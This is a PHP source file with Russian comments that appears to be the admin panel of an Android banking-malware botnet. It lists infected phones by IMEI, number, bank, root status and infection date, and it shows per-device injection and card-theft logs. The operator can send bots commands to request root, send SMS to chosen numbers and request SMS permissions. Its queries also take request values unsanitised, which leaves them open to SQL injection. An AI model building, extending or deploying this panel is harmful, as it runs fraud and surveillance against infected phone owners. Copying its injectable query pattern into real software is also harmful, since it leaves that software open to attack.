<div class="content">
<table class="footable" align="center" border="1" cellspacing="0" cellpadding="0" width=100%>
	<thead class="header_table_bots" >	
	    <th></th>
		<th>IMEI/ID</th>
		<th>Номер</th>	
		<th>Версия<br>ОС</th>
		<th>Версия<br>apk</th>
		<th>Страна</th>
		<th>Банк</th>
		<th>Модель</th>
		<th>ROOT</th>
		<th>Экран</th>
		<th>on/off</th>
		<th>Дата<br>заражения</th>
		<th>Логи</th>
	</thead>

	
	<?php

		include 'crypt.php';
		include 'config.php';
		
		$count_id_page=0;
		$page = $_GET["page"];
		$page1 = $_GET["page"];
		$count_id = 30;
		
		if($page =="" || $page == "1")
		{
			$page=0;
		}
		else
		{
			$page = ($page*$count_id)-$count_id;
		}
			
		$connection = new PDO('mysql:host='.SERVER.';dbname='.DB, USER, PASSWORD);
        $connection->exec('SET NAMES utf8');       
        $sql = "SELECT * FROM kliets limit $page,$count_id";
		$booleanIMEI = false;
				
		
	
		//echo encrypt("12345:12.12:34.34:GPS:","qwe");			
					
		//echo decrypt("49 5q 5w 5e 53 37 5w 65 49 5q 46 49 5q 37 5w 65 5w 5e 37 5w 65 5w 5e 37 5w 65 7w 8q 83","qwe");	
							
		
					
		//*****Обработка запросa Для удаления!
		if(isset($_POST["delete"]))
		{
			if (preg_match("/checks/",print_r($_POST,true))) 
			{
				foreach($_POST["checks"] as $id)
				{
					$id_del = explode(":", $id); 
					$sql2 = "DELETE FROM kliets WHERE id='".$id_del[0]."'";
					$connection->query($sql2);
				}
			}
				header ("Location: index.php?cont=kliets&page=$page1");
		}
		
		if(isset($_POST["add_commands"]))//вызываем модальную форму!
		{
			if (preg_match("/checks/",print_r($_POST,true))) 
			{
				foreach($_POST["checks"] as $imei)
				{
					echo "<script>";
						echo "$(document).ready(function(){";		
							echo "$('#parent_modal').css({'display':'block'});";
						echo "});";
					echo "</script>";
				}
			}
		}
		
		if(isset($_POST["click_log"]))//Открываем форму логи!
		{
		
			$log_IMEI = $_POST["click_log"];
					echo "<script>";
						echo "$(document).ready(function(){";		
							echo "$('#log_modal').css({'display':'block'});";
						echo "});";
					echo "</script>";
		}
		
		if(isset($_POST["click_set"]))//Открываем форму настроек!
		{
		
			$set_IMEI = $_POST["click_set"];
					echo "<script>";
						echo "$(document).ready(function(){";		
							echo "$('#set_modal').css({'display':'block'});";
						echo "});";
					echo "</script>";
		}
		
		//******батоны и переменые с базы!********

	    echo "<form name='callback' method='post'>";
		echo "<input type='submit'  value='Добавить команду' name='add_commands' class='submit'/>";
		echo "<input type='submit' value='Удалить' name='delete' class='submit'/>";
		echo "<input type='submit' value='Обновить' name='rrr' class='submit'/>";
		
		$count_bots = 0;
		
		foreach($connection->query($sql) as $row)
		{
			$ID = $row['id'];
			$IMEI = $row['IMEI'];
			$number = $row['number'];
			$version = $row['version'];
			$version_apk = $row['version_apk'];
			$country = $row['country'];
			$bank = $row['bank']; 
			$model = $row['model'];
			$lastConnect = $row['lastConnect'];
			$firstConnect = $row['firstConnect'];
			$l_inj=$row['inj'];
			$l_bank=$row['l_bank'];
			$l_log=$row['log'];
			$root=$row['r00t'];
			$screen=$row['screen'];
			//$color=$row['color'];
			
			//******Получаем иконку состояния бота, вычисляем дату****
			$arr_data_from = explode(" ", $row['lastConnect']);
			$arr_data_till = explode(" ", date('Y-m-d H:i')); 
				
			$date_from = $arr_data_from[0];
			$date_till = $arr_data_till[0]; 
			
			$date_from = explode('-', $date_from);
			$date_till = explode('-', $date_till);
	 
			$time_from = mktime(0, 0, 0, $date_from[1], $date_from[2], $date_from[0]);
			$time_till = mktime(0, 0, 0, $date_till[1], $date_till[2], $date_till[0]);
			
			$day = ($time_till - $time_from)/60/60/24; //получаем разницу кол-во дней!
			//----------Секунды!-------/
			$date1 = new \DateTime($row['lastConnect']);
			$date2 = new \DateTime(date('Y-m-d H:i'));
			$diff = $date2->diff($date1);
			// разница в секундах
			$seconds = ($diff->y * 365 * 24 * 60 * 60) + //получаем разницу в секундах!
			($diff->m * 30 * 24 * 60 * 60) +
			($diff->d * 24 * 60 * 60) +
			($diff->h * 60 * 60) +
			($diff->i * 60) +
			$diff->s;
			//----------обработка состояние иконки on/off-------/
			if($day>=2)//Дни!
			{
				$img="/admin/images/icons/kill.png";
			}
			else
			{
				if($seconds<=120)
				{$img="/admin/images/icons/online.png";}
				else
				{$img="/admin/images/icons/offline.png";}
			}
			//************Иконки ЛОГОВ***************************************
			if($l_inj == "1")
			{$icon_inj="/admin/images/icons/inj_on.png";}
			else
			{$icon_inj="/admin/images/icons/inj_off.png";}
		
			if($l_bank == "1")
			{$icon_bank="/admin/images/icons/bank_on.png";}
			else
			{$icon_bank="/admin/images/icons/bank_off.png";}
		
			if($l_log == "1")
			{$icon_log="/admin/images/icons/log_on.png";}
			else
			{$icon_log="/admin/images/icons/log_off.png";}
		
			/**/
			if($root == "1")
			{$icon_root="/admin/images/icons/V.png";}
			else
			{$icon_root="/admin/images/icons/X.png";}
		
			if($seconds<=120)
			{
				if($screen == "1")
				{$icon_screen="/admin/images/icons/V.png";}
				else
				{$icon_screen="/admin/images/icons/X.png";}
			}
			else
			{
				$icon_screen="/admin/images/icons/X.png";
			}
			//----страны
			
			if($country == "") $country = "not";
				
			$country =  mb_strtolower($country);	
			//************Данные в таблице********************************************

			echo "<tr class='table_bots' style='color: #A4A4A4;'>";
			
			echo "
				<td><input type=checkbox name=checks[] value=$ID:$IMEI></input></td>
				<td>$IMEI</td>
				<td>$number</td>
				<td>$version</td>
				<td>$version_apk</td>
				<td><a title='$country'><img src='/admin/images/country/$country.png' width='16px'/></a></td>
				<td>$bank</td>
				<td>$model</td>
				<td>
				<a title='root права'><img src=$icon_root width='16px'/></a>
				</td>
				<td>
				<a title='Состояние экрана'><img src=$icon_screen width='16px'/></a>
				</td>
				<td><a title='$lastConnect'><img src=$img width='16px'/></a></td>
				<td>$firstConnect</td>
				<td>
				<a title='Инжект'><img src=$icon_inj width='16px'/></a>
				<a title='Visa'><img src=$icon_bank width='16px'/></a>
			    <button class='btn_log' name='click_log' value='$IMEI' title='Логи' ><img src='$icon_log' title='Логи' alt='img' width='16px' class='img_log'/></button>
				</td>
				</tr>";		
					
		}
		 echo "</form>";
		
		
	
		//	id 	IMEI 	number 	version 	country 	bank 	model 	lastConnect 	firstConnect 
		?>
</table>
<?php

//НОМЕРА СТРАНИЦ
        $connection->exec('SET NAMES utf8');       
        $sql2 = "SELECT * FROM kliets";
		foreach($connection->query($sql2) as $row)
		{
			$count_id_page++;	
		}
			
	    $a = ceil($count_id_page/$count_id);
		echo "<center>";
		for($b=1;$b<=$a;$b++)
		{
			echo "<a style='color: #fff; font-family: Consolas;' href='index.php?cont=kliets&page=$b' style='text-decoration:none;'>$b</a>";
		}
		echo "</center>";
?>

<?php//-------------конец таблице--------------------начало----------------------Модальное окно для Добавления команд-----?>


<div id = "parent_modal">
	<div id = "modal">
	<a id="exit" href="index.php?cont=kliets&page=<?php echo $page1;?>" style="cursor: pointer; color: Red;" onclick="document.getElementById('parent_modal').style.display = 'none'";>X</a>
		<div class="styled-select">
		
		<form name="modal_command"  method="POST" action="/private/command_go_modul.php"> 
			Выбраные боты<select name="comboBox_imeis" style="color: #fff">
			
			
<?php 		//--------вставляем IMEIs в текстовое поле--------

		if(isset($_POST["add_commands"]))
		{
			if (preg_match("/checks/",print_r($_POST,true))) 
			{
				$t_i="";
				foreach($_POST["checks"] as $imei)
				{
					$imei_add = explode(":", $imei);
					echo "<option value='$imei_add[0]'>$imei_add[1]";
					$t_i = "$t_i:$imei_add[1]";
				}
				echo "<input type='text' value='$t_i' name='text_imei' style='visibility:hidden'/>";
			}
		}	
?>
			</select> 
			Выберите команду
				<select  name="comboBox_commands" onchange="showOption(this)" style="color: #fff">
					<option value='null'>
					<option value='r_root'>Запросить root права
					<option value='sentSMS'>Отправть СМС
					<option value='startPermis'>Запрос разрешения чтения/отправки СМС(Android 6.0 и более)
				</select> 

			<div  id="div_sent_sms" name="div_sent_sms" style="visibility:hidden">
			Введите номер<input type="text" name="text_number" id="styled-select" style="color: #fff; background: #1D1F24;"></input>
			Введите текст СМС<input type="text" name="text_msg" id="styled-select" style="color: #fff; background: #1D1F24;"></input>
			</div>
		</div>
			
			<script type="text/javascript">
			  function showOption(el)
			  {
				  if(el.options[el.selectedIndex].value == "sentSMS")//отправка смс
				  {
					   document.getElementById("div_sent_sms").style.visibility = "visible";
				  }else
				  {
					  document.getElementById("div_sent_sms").style.visibility = "hidden";
				  }
			  }
			</script>
			
			<input style="margin-top:0px;" type="submit" id="bth_add_command" value="Активировать команду" name="bth_add_command" class="submit"/>
				

<?php echo "<input type='text' value='$page1' name='ref' style='visibility:hidden'/>"; //передаем номер страницы
?>
			</form>
		</div>
	</div>
</div>

<?php//--форма ЛОГ модульное окно!------rows="31" cols="158"--------?>
<div id = "log_modal">
	<div id = "modal_l">
	<a id="exit" href="index.php?cont=kliets&page=<?php echo $page1;?>"  style="margin-left:97%; cursor: pointer; color: Red;" onclick="document.getElementById('log_modal').style.display = 'none'";>X</a>
		<div class="styled-select">
			
			<textarea readonly name="mesage"  wrap="virtual" class="textlog">
			<?php 
			
			$sql3 = "UPDATE kliets SET inj = '0', l_bank = '0', log = '0' WHERE IMEI = '$log_IMEI';";
			$connection->query($sql3);
			if (@fopen("private/logs/$log_IMEI.log", "r")){ // проверяем на существование файла
				//читаем
				   $filename = "private/logs/$log_IMEI.log";
                  $handle = fopen($filename, "r");
                  $contents = fread($handle, filesize($filename));
                  fclose($handle);
                  echo "$contents";
			}
			?></textarea>
				
		</div>
	</div>
</div>

</div>

